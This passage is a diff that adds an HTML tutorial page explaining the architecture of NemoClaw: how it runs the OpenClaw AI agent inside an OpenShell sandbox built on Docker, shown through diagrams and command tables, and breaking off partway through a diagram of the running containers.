@@ -1,0 +1,1061 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NemoClaw Tutorial — Architecture, Security &amp; How It All Fits Together</title>
+<style>
+  :root {
+    --nv-green: #76b900;
+    --nv-green-dark: #5a8f00;
+    --nv-green-light: #e8f5cc;
+    --nv-black: #1a1a2e;
+    --nv-dark: #16213e;
+    --nv-mid: #0f3460;
+    --nv-accent: #e94560;
+    --bg: #fafbfc;
+    --card-bg: #ffffff;
+    --text: #2d3748;
+    --text-light: #718096;
+    --border: #e2e8f0;
+    --code-bg: #1e1e2e;
+    --code-text: #cdd6f4;
+    --toc-width: 280px;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.7;
+    display: flex;
+  }
+
+  /* ── Sidebar TOC ─────────────────────────────────────── */
+  #toc {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: var(--toc-width);
+    height: 100vh;
+    background: var(--nv-black);
+    color: #cbd5e0;
+    overflow-y: auto;
+    padding: 24px 0;
+    z-index: 100;
+    transition: transform 0.3s ease;
+  }
+
+  #toc-header {
+    padding: 0 20px 20px;
+    border-bottom: 1px solid rgba(255,255,255,0.1);
+    margin-bottom: 12px;
+  }
+
+  #toc-header h2 {
+    font-size: 18px;
+    color: var(--nv-green);
+    font-weight: 700;
+    letter-spacing: 0.5px;
+  }
+
+  #toc-header p {
+    font-size: 12px;
+    color: #718096;
+    margin-top: 4px;
+  }
+
+  #toc ul {
+    list-style: none;
+    padding: 0 12px;
+  }
+
+  #toc li { margin: 2px 0; }
+
+  #toc a {
+    display: block;
+    padding: 7px 12px;
+    color: #a0aec0;
+    text-decoration: none;
+    font-size: 13.5px;
+    border-radius: 6px;
+    transition: all 0.15s;
+  }
+
+  #toc a:hover, #toc a.active {
+    background: rgba(118, 185, 0, 0.15);
+    color: var(--nv-green);
+  }
+
+  #toc .toc-section {
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 1.2px;
+    color: #4a5568;
+    padding: 16px 12px 6px;
+    font-weight: 600;
+  }
+
+  /* ── Mobile TOC toggle ──────────────────────────────── */
+  #toc-toggle {
+    display: none;
+    position: fixed;
+    top: 12px;
+    left: 12px;
+    z-index: 200;
+    background: var(--nv-black);
+    color: var(--nv-green);
+    border: 2px solid var(--nv-green);
+    border-radius: 8px;
+    padding: 8px 14px;
+    font-size: 18px;
+    cursor: pointer;
+  }
+
+  @media (max-width: 900px) {
+    #toc { transform: translateX(-100%); }
+    #toc.open { transform: translateX(0); }
+    #toc-toggle { display: block; }
+    main { margin-left: 0 !important; }
+  }
+
+  /* ── Main content ───────────────────────────────────── */
+  main {
+    margin-left: var(--toc-width);
+    max-width: 880px;
+    padding: 40px 48px 80px;
+    flex: 1;
+  }
+
+  h1 {
+    font-size: 2.4em;
+    color: var(--nv-black);
+    margin-bottom: 8px;
+    line-height: 1.2;
+  }
+
+  h1 span { color: var(--nv-green); }
+
+  .subtitle {
+    font-size: 1.1em;
+    color: var(--text-light);
+    margin-bottom: 40px;
+  }
+
+  h2 {
+    font-size: 1.65em;
+    color: var(--nv-black);
+    margin: 56px 0 20px;
+    padding-bottom: 10px;
+    border-bottom: 3px solid var(--nv-green);
+  }
+
+  h3 {
+    font-size: 1.25em;
+    color: var(--nv-dark);
+    margin: 36px 0 14px;
+  }
+
+  h4 {
+    font-size: 1.05em;
+    color: var(--nv-mid);
+    margin: 24px 0 10px;
+  }
+
+  p { margin-bottom: 16px; }
+
+  /* ── Cards ──────────────────────────────────────────── */
+  .card {
+    background: var(--card-bg);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 24px 28px;
+    margin: 20px 0;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.04);
+  }
+
+  .card.highlight {
+    border-left: 4px solid var(--nv-green);
+  }
+
+  .card.warning {
+    border-left: 4px solid var(--nv-accent);
+    background: #fff5f5;
+  }
+
+  .card h4 {
+    margin-top: 0;
+    color: var(--nv-green-dark);
+  }
+
+  /* ── Diagram blocks ─────────────────────────────────── */
+  .diagram {
+    background: var(--code-bg);
+    color: var(--code-text);
+    border-radius: 10px;
+    padding: 20px 24px;
+    margin: 20px 0;
+    overflow-x: auto;
+    font-family: 'Cascadia Code', 'Fira Code', 'JetBrains Mono', 'Consolas', monospace;
+    font-size: 13.5px;
+    line-height: 1.55;
+    border: 1px solid #313244;
+  }
+
+  .diagram .hl-green { color: #a6e3a1; }
+  .diagram .hl-blue { color: #89b4fa; }
+  .diagram .hl-yellow { color: #f9e2af; }
+  .diagram .hl-red { color: #f38ba8; }
+  .diagram .hl-pink { color: #f5c2e7; }
+  .diagram .hl-teal { color: #94e2d5; }
+  .diagram .hl-dim { color: #585b70; }
+
+  .diagram-caption {
+    text-align: center;
+    font-size: 13px;
+    color: var(--text-light);
+    margin-top: -12px;
+    margin-bottom: 20px;
+    font-style: italic;
+  }
+
+  /* ── Tables ─────────────────────────────────────────── */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0 24px;
+    font-size: 14.5px;
+  }
+
+  th {
+    background: var(--nv-black);
+    color: var(--nv-green);
+    padding: 10px 14px;
+    text-align: left;
+    font-weight: 600;
+    font-size: 13px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+
+  th:first-child { border-radius: 8px 0 0 0; }
+  th:last-child { border-radius: 0 8px 0 0; }
+
+  td {
+    padding: 10px 14px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  tr:hover td { background: var(--nv-green-light); }
+
+  /* ── Inline code ────────────────────────────────────── */
+  code {
+    background: #edf2f7;
+    padding: 2px 7px;
+    border-radius: 4px;
+    font-family: 'Cascadia Code', 'Fira Code', Consolas, monospace;
+    font-size: 0.88em;
+    color: var(--nv-mid);
+  }
+
+  /* ── Flow steps ─────────────────────────────────────── */
+  .flow-steps {
+    counter-reset: step;
+    padding-left: 0;
+    list-style: none;
+  }
+
+  .flow-steps li {
+    counter-increment: step;
+    position: relative;
+    padding: 14px 18px 14px 60px;
+    margin: 8px 0;
+    background: var(--card-bg);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    min-height: 48px;
+  }
+
+  .flow-steps li::before {
+    content: counter(step);
+    position: absolute;
+    left: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 30px;
+    height: 30px;
+    background: var(--nv-green);
+    color: white;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 700;
+    font-size: 14px;
+  }
+
+  .flow-steps .actor {
+    display: inline-block;
+    background: var(--nv-black);
+    color: var(--nv-green);
+    padding: 1px 8px;
+    border-radius: 4px;
+    font-size: 12px;
+    font-weight: 600;
+    margin-right: 6px;
+    vertical-align: middle;
+  }
+
+  /* ── Security layers ────────────────────────────────── */
+  .security-stack {
+    display: flex;
+    flex-direction: column;
+    gap: 0;
+    margin: 20px 0;
+  }
+
+  .security-layer {
+    padding: 16px 20px;
+    border: 2px solid;
+    position: relative;
+  }
+
+  .security-layer:first-child { border-radius: 12px 12px 0 0; }
+  .security-layer:last-child { border-radius: 0 0 12px 12px; }
+
+  .security-layer h4 { margin: 0 0 6px; font-size: 15px; }
+  .security-layer p { margin: 0; font-size: 14px; color: var(--text-light); }
+
+  .layer-5 { background: #f0fff4; border-color: #48bb78; }
+  .layer-5 h4 { color: #276749; }
+  .layer-4 { background: #ebf8ff; border-color: #4299e1; }
+  .layer-4 h4 { color: #2b6cb0; }
+  .layer-3 { background: #fefcbf; border-color: #ecc94b; }
+  .layer-3 h4 { color: #975a16; }
+  .layer-2 { background: #fed7e2; border-color: #ed64a6; }
+  .layer-2 h4 { color: #97266d; }
+  .layer-1 { background: #e9d8fd; border-color: #9f7aea; }
+  .layer-1 h4 { color: #553c9a; }
+
+  /* ── Grid layout for comparison ─────────────────────── */
+  .grid-4 {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+    gap: 16px;
+    margin: 20px 0;
+  }
+
+  .grid-4 .grid-item {
+    background: var(--card-bg);
+    border: 2px solid var(--border);
+    border-radius: 10px;
+    padding: 18px;
+    text-align: center;
+  }
+
+  .grid-4 .grid-item h4 {
+    margin: 0 0 8px;
+    font-size: 16px;
+  }
+
+  .grid-4 .grid-item p {
+    font-size: 13px;
+    color: var(--text-light);
+    margin: 0;
+  }
+
+  .grid-4 .grid-item.g-green { border-color: var(--nv-green); }
+  .grid-4 .grid-item.g-green h4 { color: var(--nv-green-dark); }
+  .grid-4 .grid-item.g-blue { border-color: #4299e1; }
+  .grid-4 .grid-item.g-blue h4 { color: #2b6cb0; }
+  .grid-4 .grid-item.g-purple { border-color: #9f7aea; }
+  .grid-4 .grid-item.g-purple h4 { color: #553c9a; }
+  .grid-4 .grid-item.g-red { border-color: var(--nv-accent); }
+  .grid-4 .grid-item.g-red h4 { color: #c53030; }
+
+  /* ── Footer ─────────────────────────────────────────── */
+  footer {
+    margin-top: 60px;
+    padding: 24px 0;
+    border-top: 2px solid var(--border);
+    color: var(--text-light);
+    font-size: 13px;
+    text-align: center;
+  }
+
+  footer a { color: var(--nv-green-dark); }
+
+  /* ── Scroll-spy active highlight ────────────────────── */
+  #toc a.active {
+    background: rgba(118, 185, 0, 0.2);
+    color: #fff;
+    font-weight: 600;
+  }
+</style>
+</head>
+
+<body>
+
+<!-- ── Mobile TOC Toggle ───────────────────────────── -->
+<button id="toc-toggle" onclick="document.getElementById('toc').classList.toggle('open')">☰</button>
+
+<!-- ── Sidebar TOC ─────────────────────────────────── -->
+<nav id="toc">
+  <div id="toc-header">
+    <h2>NemoClaw Tutorial</h2>
+    <p>Architecture &amp; Security Guide</p>
+  </div>
+  <ul>
+    <li class="toc-section">Overview</li>
+    <li><a href="#intro">What is NemoClaw?</a></li>
+    <li><a href="#four-technologies">The Four Technologies</a></li>
+    <li><a href="#why-docker">Why Docker if We Have OpenShell?</a></li>
+
+    <li class="toc-section">Architecture</li>
+    <li><a href="#high-level">High-Level Architecture</a></li>
+    <li><a href="#layer-cake">The Layer Cake</a></li>
+    <li><a href="#two-clis">Two CLIs, One System</a></li>
+    <li><a href="#three-layers">The Three Code Layers</a></li>
+    <li><a href="#running-state">Running State: Docker Containers</a></li>
+
+    <li class="toc-section">Communication</li>
+    <li><a href="#interfaces">Six Interfaces</a></li>
+    <li><a href="#setup-flow">Setup Flow (Onboard)</a></li>
+    <li><a href="#runtime-flow">Runtime Flow (Inference)</a></li>
+    <li><a href="#policy-flow">Policy Enforcement Flow</a></li>
+    <li><a href="#migration-flow">Migration Flow</a></li>
+
+    <li class="toc-section">Security</li>
+    <li><a href="#security-model">Defense-in-Depth Model</a></li>
+    <li><a href="#network-policies">Network Policies</a></li>
+    <li><a href="#credential-injection">Credential Injection</a></li>
+    <li><a href="#fs-isolation">Filesystem Isolation</a></li>
+
+    <li class="toc-section">Reference</li>
+    <li><a href="#file-map">Key File Map</a></li>
+    <li><a href="#data-models">State &amp; Data Models</a></li>
+    <li><a href="#faq">FAQ</a></li>
+  </ul>
+</nav>
+
+<!-- ── Main Content ────────────────────────────────── -->
+<main>
+
+<h1>Nemo<span>Claw</span> Tutorial</h1>
+<p class="subtitle">Architecture, communication flows, security model, and how OpenClaw, OpenShell, Docker, and NemoClaw work together.</p>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="intro">What is NemoClaw?</h2>
+
+<p>NemoClaw is an NVIDIA open-source project that runs <strong>OpenClaw</strong> (an autonomous AI agent) safely inside <strong>OpenShell</strong> (a secure runtime) with inference routed through NVIDIA's cloud. It automates the entire process of sandboxing an AI agent so that every network request, file access, and model call is governed by declarative policy.</p>
+
+<div class="card highlight">
+  <h4>The One-Sentence Summary</h4>
+  <p>NemoClaw is an OpenClaw plugin that automates putting OpenClaw inside an OpenShell sandbox, built on Docker containers, with NVIDIA inference and declarative security policies.</p>
+</div>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="four-technologies">The Four Technologies</h2>
+
+<div class="grid-4">
+  <div class="grid-item g-red">
+    <h4>OpenClaw</h4>
+    <p>The AI Agent<br>"The Brain"<br><br>Runs tasks, writes code, calls APIs, has conversations</p>
+  </div>
+  <div class="grid-item g-purple">
+    <h4>Docker</h4>
+    <p>Container Engine<br>"The Building Material"<br><br>Provides isolated containers everything runs inside</p>
+  </div>
+  <div class="grid-item g-blue">
+    <h4>OpenShell</h4>
+    <p>Security Runtime<br>"The Security System"<br><br>Adds policies, credential injection, monitoring on top of Docker</p>
+  </div>
+  <div class="grid-item g-green">
+    <h4>NemoClaw</h4>
+    <p>The Glue<br>"The Contractor"<br><br>Orchestrates setup, builds images, configures everything</p>
+  </div>
+</div>
+
+<table>
+  <tr><th>Technology</th><th>Can Work Alone?</th><th>Depends On</th></tr>
+  <tr><td><strong>OpenClaw</strong></td><td>Yes (but unsandboxed)</td><td>Node.js</td></tr>
+  <tr><td><strong>Docker</strong></td><td>Yes (general-purpose)</td><td>Linux kernel</td></tr>
+  <tr><td><strong>OpenShell</strong></td><td>Yes (can sandbox any app)</td><td>Docker</td></tr>
+  <tr><td><strong>NemoClaw</strong></td><td>No (integration layer only)</td><td>Docker + OpenShell + OpenClaw</td></tr>
+</table>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="why-docker">Why Docker if We Have OpenShell?</h2>
+
+<div class="card highlight">
+  <h4>Key Insight</h4>
+  <p>OpenShell doesn't replace Docker &mdash; it's <strong>built on top of it</strong>. Docker is the foundation; OpenShell is a security layer added on top. Without Docker, OpenShell has nothing to build on.</p>
+</div>
+
+<p>Every <code>openshell</code> command translates to Docker commands internally:</p>
+
+<table>
+  <tr><th>You Run</th><th>OpenShell Internally Does</th></tr>
+  <tr><td><code>openshell gateway start</code></td><td><code>docker run</code> (starts k3s container)</td></tr>
+  <tr><td><code>openshell sandbox create</code></td><td><code>docker build</code> + <code>docker run</code></td></tr>
+  <tr><td><code>openshell sandbox connect</code></td><td><code>docker exec</code></td></tr>
+  <tr><td><code>openshell sandbox delete</code></td><td><code>docker stop</code> + <code>docker rm</code></td></tr>
+</table>
+
+<h4>What each layer adds:</h4>
+<table>
+  <tr><th>Capability</th><th>Docker Alone</th><th>Docker + OpenShell</th></tr>
+  <tr><td>Isolated filesystem</td><td>✓ container has its own FS</td><td>✓ + Landlock per-path read/write rules</td></tr>
+  <tr><td>Isolated network</td><td>✓ own network namespace</td><td>✓ + YAML policies per host/port/method</td></tr>
+  <tr><td>Isolated processes</td><td>✓ own PID namespace</td><td>✓ + seccomp syscall filtering</td></tr>
+  <tr><td>API credentials</td><td>Pass as env vars (visible)</td><td>Injected at proxy (invisible to app)</td></tr>
+  <tr><td>Monitoring</td><td><code>docker logs</code></td><td>Real-time TUI with approval queue</td></tr>
+  <tr><td>Inference routing</td><td>Manual configuration</td><td>Transparent proxy intercepts &amp; routes</td></tr>
+</table>
+
+<p><strong>Analogy:</strong> Docker gives you a <em>room</em>. OpenShell gives you a room with <em>locks, cameras, and an alarm system</em>. NemoClaw is the <em>contractor</em> who builds the room, installs the locks, and puts the AI robot inside.</p>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="high-level">High-Level Architecture</h2>
+
+<pre class="diagram"><span class="hl-dim">┌─────────────────────────────────────────────────────────────────────┐</span>
+<span class="hl-dim">│</span>                      <span class="hl-yellow">USER'S HOST MACHINE</span>                            <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>                                                                     <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-green">┌──────────────────────┐</span>                                        <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-green">│  nemoclaw CLI        │</span>  ◄── User runs commands here            <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-green">│  (Node.js)           │</span>                                        <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-green">└──────────┬───────────┘</span>                                        <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>              │                                                      <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>              │ calls openshell CLI + docker CLI                      <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>              ▼                                                      <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-pink">╔══════════════════════ DOCKER ENGINE ═══════════════════════╗</span>   <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-pink">║</span>                                                          <span class="hl-pink">║</span>   <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-pink">║</span>   <span class="hl-blue">┌──────────────────┐</span>      <span class="hl-teal">┌──────────────────────┐</span> <span class="hl-pink">║</span>   <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-pink">║</span>   <span class="hl-blue">│ Container 1:     │</span>      <span class="hl-teal">│ Container 2:         │</span> <span class="hl-pink">║</span>   <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-pink">║</span>   <span class="hl-blue">│ OpenShell Gateway│</span>─────▶<span class="hl-teal">│ Sandbox              │</span> <span class="hl-pink">║</span>   <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-pink">║</span>   <span class="hl-blue">│                  │</span>      <span class="hl-teal">│ ┌──────────────────┐ │</span> <span class="hl-pink">║</span>   <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-pink">║</span>   <span class="hl-blue">│ • k3s cluster    │</span>      <span class="hl-teal">│ │</span> <span class="hl-red">OpenClaw agent</span>    <span class="hl-teal">│ │</span> <span class="hl-pink">║</span>   <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-pink">║</span>   <span class="hl-blue">│ • Network proxy  │</span>      <span class="hl-teal">│ │</span> <span class="hl-green">NemoClaw plugin</span>   <span class="hl-teal">│ │</span> <span class="hl-pink">║</span>   <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-pink">║</span>   <span class="hl-blue">│ • Policy engine  │</span>      <span class="hl-teal">│ │ Python 3.11       │ │</span> <span class="hl-pink">║</span>   <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-pink">║</span>   <span class="hl-blue">│ • Credential mgr │</span>      <span class="hl-teal">│ └──────────────────┘ │</span> <span class="hl-pink">║</span>   <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-pink">║</span>   <span class="hl-blue">└──────────────────┘</span>      <span class="hl-teal">│ + Landlock + seccomp │</span> <span class="hl-pink">║</span>   <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-pink">║</span>                              <span class="hl-teal">└──────────┬───────────┘</span> <span class="hl-pink">║</span>   <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-pink">║</span>   <span class="hl-yellow">┌──────────────────┐</span>                 │            <span class="hl-pink">║</span>   <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-pink">║</span>   <span class="hl-yellow">│ Container 3:     │</span>  (optional)     │            <span class="hl-pink">║</span>   <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-pink">║</span>   <span class="hl-yellow">│ NIM Model Server │</span>                 │            <span class="hl-pink">║</span>   <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-pink">║</span>   <span class="hl-yellow">│ GPU: --gpus all  │</span>                 │            <span class="hl-pink">║</span>   <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-pink">║</span>   <span class="hl-yellow">└──────────────────┘</span>                 │            <span class="hl-pink">║</span>   <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>   <span class="hl-pink">╚══════════════════════════════════════════════════════════╝</span>   <span class="hl-dim">│</span>
+<span class="hl-dim">│</span>                                           │                        <span class="hl-dim">│</span>
+<span class="hl-dim">└───────────────────────────────────────────│────────────────────────┘</span>
+                                            │  HTTPS
+                                            ▼
+                                  <span class="hl-green">┌──────────────────────┐</span>
+                                  <span class="hl-green">│  NVIDIA Cloud API    │</span>
+                                  <span class="hl-green">│  (or local NIM)      │</span>
+                                  <span class="hl-green">└──────────────────────┘</span></pre>
+<p class="diagram-caption">Figure 1: High-level architecture — all components run as Docker containers managed by OpenShell, orchestrated by NemoClaw</p>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="layer-cake">The Layer Cake</h2>
+
+<p>Each technology builds on the one below it:</p>
+
+<pre class="diagram"><span class="hl-green"> Layer 4 │  NemoClaw       │  Orchestration    │ "How to set up"       </span>
+<span class="hl-dim">─────────┼─────────────────┼───────────────────┼───────────────────────</span>
+<span class="hl-red"> Layer 3 │  OpenClaw       │  AI Agent         │ "What to do"          </span>
+<span class="hl-dim">─────────┼─────────────────┼───────────────────┼───────────────────────</span>
+<span class="hl-blue"> Layer 2 │  OpenShell      │  Security Runtime │ "What's allowed"      </span>
+<span class="hl-dim">─────────┼─────────────────┼───────────────────┼───────────────────────</span>
+<span class="hl-pink"> Layer 1 │  Docker         │  Containers       │ "Where to run"        </span>
+<span class="hl-dim">─────────┼─────────────────┼───────────────────┼───────────────────────</span>
+<span class="hl-dim"> Layer 0 │  Linux Kernel   │  Namespaces,      │ cgroups, Landlock,    </span>
+<span class="hl-dim">         │                 │  seccomp          │ low-level primitives  </span></pre>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="two-clis">Two CLIs, One System</h2>
+
+<p>NemoClaw provides two independent command-line interfaces:</p>
+
+<pre class="diagram"><span class="hl-green">┌──────────────────────────┐</span>      <span class="hl-blue">┌──────────────────────────────┐</span>
+<span class="hl-green">│  HOST CLI                │</span>      <span class="hl-blue">│  PLUGIN CLI                  │</span>
+<span class="hl-green">│  nemoclaw &lt;cmd&gt;          │</span>      <span class="hl-blue">│  openclaw nemoclaw &lt;cmd&gt;     │</span>
+<span class="hl-green">│                          │</span>      <span class="hl-blue">│                              │</span>
+<span class="hl-green">│  • Pre-sandbox setup     │</span>      <span class="hl-blue">│  • Blueprint lifecycle       │</span>
+<span class="hl-green">│  • Gateway management    │</span>      <span class="hl-blue">│  • Migration logic           │</span>
+<span class="hl-green">│  • NIM containers        │</span>      <span class="hl-blue">│  • Status reporting          │</span>
+<span class="hl-green">│  • Policy presets        │</span>      <span class="hl-blue">│  • Eject / rollback          │</span>
+<span class="hl-green">│                          │</span>      <span class="hl-blue">│                              │</span>
+<span class="hl-green">│  Source: bin/nemoclaw.js │</span>      <span class="hl-blue">│  Source: nemoclaw/src/       │</span>
+<span class="hl-green">└────────────┬─────────────┘</span>      <span class="hl-blue">└──────────────┬───────────────┘</span>
+             │                                    │
+             └──────────────┬─────────────────────┘
+                            ▼
+              <span class="hl-yellow">┌──────────────────────────┐</span>
+              <span class="hl-yellow">│  openshell CLI           │</span>
+              <span class="hl-yellow">│  + docker CLI            │</span>
+              <span class="hl-yellow">└──────────────────────────┘</span></pre>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="three-layers">The Three Code Layers</h2>
+
+<pre class="diagram"><span class="hl-green">┌─── Layer 1: Host CLI ─────────────────────────────────────────────┐</span>
+<span class="hl-green">│</span>  <span class="hl-dim">bin/nemoclaw.js</span>           Entry point, command dispatcher       <span class="hl-green">│</span>
+<span class="hl-green">│</span>  <span class="hl-dim">bin/lib/onboard.js</span>        7-step interactive setup wizard        <span class="hl-green">│</span>
+<span class="hl-green">│</span>  <span class="hl-dim">bin/lib/registry.js</span>       Sandbox metadata (sandboxes.json)      <span class="hl-green">│</span>
+<span class="hl-green">│</span>  <span class="hl-dim">bin/lib/credentials.js</span>    API key storage (mode 0600)            <span class="hl-green">│</span>
+<span class="hl-green">│</span>  <span class="hl-dim">bin/lib/nim.js</span>            NIM container lifecycle                <span class="hl-green">│</span>
+<span class="hl-green">│</span>  <span class="hl-dim">bin/lib/policies.js</span>       Network policy presets                 <span class="hl-green">│</span>
+<span class="hl-green">│</span>  <span class="hl-dim">bin/lib/preflight.js</span>      System checks (Docker, cgroups)        <span class="hl-green">│</span>
+<span class="hl-green">│</span>  Runtime: Node.js / CommonJS                                    <span class="hl-green">│</span>
+<span class="hl-green">└───────────────────────────────────────────────────────────────────┘</span>
+                            │ spawns
+                            ▼
+<span class="hl-blue">┌─── Layer 2: TypeScript Plugin ────────────────────────────────────┐</span>
+<span class="hl-blue">│</span>  <span class="hl-dim">nemoclaw/src/index.ts</span>     Plugin registration entry point        <span class="hl-blue">│</span>
+<span class="hl-blue">│</span>  <span class="hl-dim">nemoclaw/src/cli.ts</span>       Commander.js subcommand wiring         <span class="hl-blue">│</span>
+<span class="hl-blue">│</span>  <span class="hl-dim">commands/launch.ts</span>        Fresh bootstrap into OpenShell         <span class="hl-blue">│</span>
+<span class="hl-blue">│</span>  <span class="hl-dim">commands/migrate.ts</span>       Host → sandbox migration               <span class="hl-blue">│</span>
+<span class="hl-blue">│</span>  <span class="hl-dim">commands/eject.ts</span>         Rollback to host                       <span class="hl-blue">│</span>
+<span class="hl-blue">│</span>  <span class="hl-dim">blueprint/resolve.ts</span>      Version resolution + caching           <span class="hl-blue">│</span>
+<span class="hl-blue">│</span>  <span class="hl-dim">blueprint/verify.ts</span>       SHA-256 digest + compatibility         <span class="hl-blue">│</span>
+<span class="hl-blue">│</span>  <span class="hl-dim">blueprint/exec.ts</span>         Python subprocess runner               <span class="hl-blue">│</span>
+<span class="hl-blue">│</span>  Runtime: TypeScript / ESM                                      <span class="hl-blue">│</span>
+<span class="hl-blue">└───────────────────────────────────────────────────────────────────┘</span>
+                            │ subprocess (python3)
+                            ▼
+<span class="hl-yellow">┌─── Layer 3: Python Blueprint ─────────────────────────────────────┐</span>
+<span class="hl-yellow">│</span>  <span class="hl-dim">orchestrator/runner.py</span>    Plan / apply / status / rollback       <span class="hl-yellow">│</span>
+<span class="hl-yellow">│</span>  <span class="hl-dim">blueprint.yaml</span>            Version, profiles, compatibility       <span class="hl-yellow">│</span>
+<span class="hl-yellow">│</span>  <span class="hl-dim">policies/openclaw-sandbox.yaml</span>  Base security policy            <span class="hl-yellow">│</span>
+<span class="hl-yellow">│</span>  <span class="hl-dim">policies/presets/*.yaml</span>   Service network allowlists             <span class="hl-yellow">│</span>
+<span class="hl-yellow">│</span>  Runtime: Python 3.11+                                          <span class="hl-yellow">│</span>
+<span class="hl-yellow">└───────────────────────────────────────────────────────────────────┘</span>
+                            │ openshell CLI commands
+                            ▼
+                  <span class="hl-teal">┌──────────────────────┐</span>
+                  <span class="hl-teal">│   OpenShell + Docker │</span>
+                  <span class="hl-teal">└──────────────────────┘</span></pre>
+<p class="diagram-caption">Figure 2: The three code layers — Host CLI (JS), Plugin (TS), Blueprint (Python)</p>
+
+<!-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ -->
+<h2 id="running-state">Running State: Docker Containers</h2>
+
+<p>After <code>nemoclaw onboard</code> completes, up to three Docker containers are running:</p>
+
+<pre class="diagram"><span class="hl-dim">╔══════════════════════════ DOCKER ENGINE ══════════════════════════╗</span>
+<span class="hl-dim">║</span>                                                                  <span class="hl-dim">║</span>
+<span class="hl-dim">║</span>  <span class="hl-blue">┌─────────────────────────┐</span>    <span class="hl-teal">┌──────────────────────────┐</span> <span class="hl-dim">║</span>
+<span class="hl-dim">║</span>  <span class="hl-blue">│ 1. OpenShell Gateway    │</span>    <span class="hl-teal">│ 2. Sandbox               │</span> <span class="hl-dim">║</span>
+<span class="hl-dim">║</span>  <span class="hl-blue">│    (always running)     │</span>───▶<span class="hl-teal">│    (always running)      │</span> <span class="hl-dim">║</span>
+<span class="hl-dim">║</span>  <span class="hl-blue">│                         │</span>    <span class="hl-teal">│                          │</span> <span class="hl-dim">║</span>
+<span class="hl-dim">║</span>  <span class="hl-blue">│ k3s + proxy + policies  │</span>    <span class="hl-teal">│ OpenClaw + NemoClaw      │</span> <span class="hl-dim">║</span>
+<span class="hl-dim">║</span>  <span class="hl-blue">│ Created by: OpenShell   │</span>    <span class="hl-teal">│ Created by: OpenShell    │</span> <span class="hl-dim">║</span>
+<span class="hl-dim">║</span>  <span class="hl-blue">│ Triggered by: NemoClaw  │</span>    <span class="hl-teal">│ Image built by: NemoClaw │</span> <span class="hl-dim">║</span>
+<span class="hl-dim">║</span>  <span class="hl-blue">└─────────────────────────┘</span>    <span class="hl-teal">└──────────────────────────┘</span> <span class="hl-dim">║</span>
+<span class="hl-dim">║</span>                                                                  <span class="hl-dim">║</span>
+<span class="hl-dim">║</span>  <span class="hl-yellow">┌─────────────────────────┐</span>                                   <span class="hl-dim">║</span>
+<span class="hl-dim">║</span>  <span class="hl-yellow">│ 3. NIM Model Server     │</span>  (only if local GPU inference)    <span class="hl-dim">║</span>
+<span class="hl-dim">║</span>  <span class="hl-yellow">│    (optional)           │</span>                                   <span class="hl-dim">║</span>
+<span class="hl-dim">║</span>  <span class="hl-yellow">│ --gpus all, port 8000   │</span>                                   <span class="hl-dim">║</span>
+<span class="hl-dim">║</span>  <span class="hl-yellow">│ Created by: NemoClaw    │</span>  (directly, bypasses OpenShell)   <span class="hl-dim">║</span>
